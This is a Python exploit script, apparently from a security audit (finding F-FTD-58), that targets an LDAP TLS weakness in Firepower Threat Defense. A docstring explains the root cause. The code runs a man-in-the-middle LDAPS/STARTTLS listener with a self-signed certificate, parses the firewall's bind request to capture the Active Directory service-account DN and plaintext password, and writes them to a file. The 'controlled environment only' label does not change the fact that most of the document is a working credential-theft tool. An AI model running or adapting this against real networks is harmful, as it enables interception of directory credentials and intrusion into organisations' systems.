"""
F-FTD-58: FTD LDAP TLS Bypass + Plaintext Credential Capture (CONTROLLED ENVIRONMENT ONLY)

libsfclientx.so::sf_open_ldap_auth never sets LDAP_OPT_X_TLS_REQUIRE_CERT beyond TRY(4).
All auth modes (ssl/tls/sasl_tls) use simple bind — plaintext credentials over wire.

Root cause (disassembly confirmed):
  - ssl/tls: ldap_set_option(NULL, 0x6006, &0) or &4 → NEVER or TRY
  - sasl_tls: ldap_set_option(NULL, 0x6006, &0) unconditionally → NEVER
  - Bind: ldap_bind_s(ld, dn, passwd, LDAP_AUTH_SIMPLE=0x80) — plaintext
  - sasl_tls bind: ldap_sasl_bind_s(ld, dn, NULL, &berval, NULL, NULL, NULL) — mech=NULL = simple

Attack: MITM on LDAP port 636/389 between FTD management interface and AD server.
Present self-signed cert → FTD accepts (TRY mode silently ignores cert errors).
Receive plaintext AD service account DN + password from FTD bind request.
"""

# CONTROLLED ENVIRONMENT ONLY

import socket
import ssl
import threading
import struct
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s %(levelname)s %(message)s')
log = logging.getLogger('ftd-ldap-mitm')

LISTEN_HOST = '0.0.0.0'
LISTEN_PORT_LDAPS = 636    # ldaps (ssl mode)
LISTEN_PORT_STARTTLS = 389 # ldap + STARTTLS (tls mode)

# Self-signed cert for MITM (generate with: openssl req -x509 -newkey rsa:2048 -keyout mitm.key -out mitm.crt -days 365 -nodes)
MITM_CERT = '/tmp/mitm.crt'
MITM_KEY = '/tmp/mitm.key'


def decode_ldap_ber(data):
    """Parse BER-encoded LDAP PDU to extract bind request credentials."""
    findings = {}
    try:
        if len(data) < 6:
            return findings
        # LDAP message: Sequence[messageID + BindRequest]
        # BindRequest: [APPLICATION 0] SEQUENCE { version, name (DN), authentication }
        # authentication CHOICE: simple [0] OCTET STRING -- plaintext password
        i = 0
        # Skip outer sequence header
        if data[i] != 0x30:
            return findings
        i += 1
        # BER length
        length_byte = data[i]
        i += 1
        if length_byte & 0x80:
            num_bytes = length_byte & 0x7f
            i += num_bytes
        # Message ID: INTEGER
        if data[i] != 0x02:
            return findings
        i += 1
        id_len = data[i]; i += 1
        i += id_len  # skip message id
        # BindRequest: [APPLICATION 0] = 0x60
        if data[i] != 0x60:
            return findings
        i += 1
        # Length
        bl = data[i]; i += 1
        if bl & 0x80:
            nb = bl & 0x7f
            i += nb
        # Version: INTEGER
        if data[i] != 0x02:
            return findings
        i += 1
        vl = data[i]; i += 1
        i += vl  # skip version
        # DN: OCTET STRING
        if data[i] != 0x04:
            return findings
        i += 1
        dn_len = data[i]; i += 1
        dn = data[i:i+dn_len].decode('utf-8', errors='replace')
        i += dn_len
        findings['bind_dn'] = dn
        # Authentication: [0] simple = context tag 0x80
        if i < len(data) and data[i] == 0x80:
            i += 1
            pw_len = data[i]; i += 1
            password = data[i:i+pw_len].decode('utf-8', errors='replace')
            findings['password'] = password
    except Exception as e:
        log.debug(f"BER parse error: {e}")
    return findings


def handle_ldaps_client(conn, addr):
    """Handle LDAPS (port 636) connection — TLS from the start."""
    log.info(f"[LDAPS] Connection from FTD: {addr}")
    try:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(MITM_CERT, MITM_KEY)
        ctx.verify_mode = ssl.CERT_NONE  # don't require client cert
        tls_conn = ctx.wrap_socket(conn, server_side=True)
        log.info(f"[LDAPS] TLS handshake accepted — FTD accepted self-signed cert (REQUIRE_CERT=TRY/NEVER)")
        while True:
            data = tls_conn.recv(4096)
            if not data:
                break
            log.debug(f"[LDAPS] RX {len(data)} bytes: {data.hex()[:80]}")
            creds = decode_ldap_ber(data)
            if creds:
                log.critical(f"[LDAPS] CAPTURED CREDENTIALS from {addr}:")
                log.critical(f"  Bind DN:  {creds.get('bind_dn', '?')}")
                log.critical(f"  Password: {creds.get('password', '?')}")
                # Write to file for persistence
                with open('/tmp/ftd-ldap-creds.txt', 'a') as f:
                    f.write(f"FTD {addr[0]} LDAPS bind:\n  DN: {creds.get('bind_dn', '?')}\n  PW: {creds.get('password', '?')}\n")
    except ssl.SSLError as e:
        log.warning(f"[LDAPS] TLS error from {addr}: {e}")
    except Exception as e:
        log.error(f"[LDAPS] Error: {e}")
    finally:
        conn.close()


def handle_starttls_client(conn, addr):
    """Handle LDAP + STARTTLS (port 389)."""
    log.info(f"[STARTTLS] Connection from FTD: {addr}")
    try:
        # Wait for STARTTLS extended request, respond with success
        while True:
            data = conn.recv(4096)
            if not data:
                break
            log.debug(f"[STARTTLS] RX {len(data)} bytes: {data.hex()[:80]}")
            # Check for STARTTLS extended request (OID 1.3.6.1.4.1.1466.20037)
            if b'1.3.6.1.4.1.1466.20037' in data or b'\x77' in data[:5]:
                log.info("[STARTTLS] Sending success response to STARTTLS request")
                # ExtendedResponse success: Sequence[msgID, ExtendedResponse]
                # Send back: 0x30 <len> 0x02 0x01 <msgid> 0x78 <len> 0x0a 0x01 0x00
                msg_id = 1
                if len(data) >= 6 and data[2] == 0x02:
                    msg_id = data[5]  # approximate
                # LDAPResult success = 0
                inner = b'\x0a\x01\x00\x04\x00\x04\x00'  # resultCode=0, matchedDN="", errorMessage=""
                ext_resp = b'\x78' + bytes([len(inner)]) + inner
                msg_id_enc = b'\x02\x01' + bytes([msg_id])
                outer = msg_id_enc + ext_resp
                response = b'\x30' + bytes([len(outer)]) + outer
                conn.send(response)
                # Upgrade to TLS
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                ctx.load_cert_chain(MITM_CERT, MITM_KEY)
                ctx.verify_mode = ssl.CERT_NONE
                tls_conn = ctx.wrap_socket(conn, server_side=True)
                log.info(f"[STARTTLS] TLS upgrade accepted — FTD accepted self-signed cert")
                while True:
                    tls_data = tls_conn.recv(4096)
                    if not tls_data:
                        break
                    log.debug(f"[STARTTLS] TLS RX {len(tls_data)} bytes")
                    creds = decode_ldap_ber(tls_data)
                    if creds:
                        log.critical(f"[STARTTLS] CAPTURED CREDENTIALS from {addr}:")
                        log.critical(f"  Bind DN:  {creds.get('bind_dn', '?')}")
                        log.critical(f"  Password: {creds.get('password', '?')}")
                        with open('/tmp/ftd-ldap-creds.txt', 'a') as f:
                            f.write(f"FTD {addr[0]} STARTTLS bind:\n  DN: {creds.get('bind_dn', '?')}\n  PW: {creds.get('password', '?')}\n")
                break
    except ssl.SSLError as e:
        log.warning(f"[STARTTLS] TLS error from {addr}: {e}")
    except Exception as e:
        log.error(f"[STARTTLS] Error: {e}")
    finally:
        conn.close()


def start_server(port, handler):
    """Start TCP listener on port."""
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((LISTEN_HOST, port))
    srv.listen(10)
    log.info(f"Listening on {LISTEN_HOST}:{port}")
    while True:
        conn, addr = srv.accept()
        t = threading.Thread(target=handler, args=(conn, addr), daemon=True)
        t.start()


def generate_self_signed_cert():
    """Generate self-signed cert for MITM if not present."""
    import subprocess, os
    if not os.path.exists(MITM_CERT):
        log.info("Generating self-signed cert for MITM...")
        subprocess.run([
            'openssl', 'req', '-x509', '-newkey', 'rsa:2048',
            '-keyout', MITM_KEY, '-out', MITM_CERT,
            '-days', '365', '-nodes', '-subj', '/CN=mitm-ldap'
        ], check=True, capture_output=True)
        log.info(f"Cert at {MITM_CERT}, key at {MITM_KEY}")


if __name__ == '__main__':
    print("=" * 60)
    print("F-FTD-58: FTD LDAP TLS Bypass MITM — CONTROLLED ENVIRONMENT ONLY")
    print("=" * 60)
    print(f"\nPoint FTD LDAP auth server config to this machine's IP")
    print(f"FTD LDAP modes: ssl (port 636) | tls/sasl_tls (port 389)")
    print(f"Captured credentials → /tmp/ftd-ldap-creds.txt\n")
    print("Root cause: LDAP_OPT_X_TLS_REQUIRE_CERT never exceeds TRY(4)")
    print("           All modes use simple bind (plaintext password)\n")

    generate_self_signed_cert()

    # Start both listeners
    t1 = threading.Thread(target=start_server, args=(LISTEN_PORT_LDAPS, handle_ldaps_client), daemon=True)
    t2 = threading.Thread(target=start_server, args=(LISTEN_PORT_STARTTLS, handle_starttls_client), daemon=True)
    t1.start()
    t2.start()
    log.info("Both listeners started. Waiting for FTD connections...")
    t1.join()
